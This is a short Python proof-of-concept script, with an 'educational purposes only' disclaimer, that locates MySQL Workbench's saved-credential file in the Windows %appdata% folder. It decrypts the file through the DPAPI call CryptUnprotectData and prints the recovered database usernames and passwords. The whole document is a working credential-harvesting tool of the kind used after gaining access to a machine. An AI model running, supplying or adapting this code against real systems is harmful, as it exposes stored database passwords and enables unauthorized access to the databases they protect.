"""
DISCLAIMER: This code is for educational and proof-of-concept purposes only.
Unauthorized access to credentials is illegal and unethical. The decryption
method might break with future MySQL Workbench updates. Use responsibly and
ethically.
"""

import os
import win32crypt
import re

def extract_workbench_credentials():
    """Attempts to extract MySQL Workbench credentials."""
    appdata = os.getenv('appdata')
    if not appdata:
        print("Error: %appdata% environment variable not found.")
        return None

    filepath = os.path.join(appdata, 'MySQL', 'Workbench', 'workbench_user_data.dat')
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
    except FileNotFoundError:
        print(f"Error: File not found: {filepath}")
        return None
    except OSError as e:
        print(f"Error reading file: {e}")
        return None

    try:
        creds_bytes = win32crypt.CryptUnprotectData(data)[1]
        creds_str = creds_bytes.decode('utf-8', errors='ignore')
        cleaned_creds = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\n\r]', '', creds_str)
        return cleaned_creds.split('\x03\x02')

    except win32crypt.error as e:
        print(f"Decryption error: {e}")
        return None
    except UnicodeDecodeError as e:
        print(f"Decoding error: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

if __name__ == "__main__":
    creds = extract_workbench_credentials()
    if creds:
        print("Extracted credentials:")
        for cred in creds:
            print(cred)
    else:
        print("Credential extraction failed.")
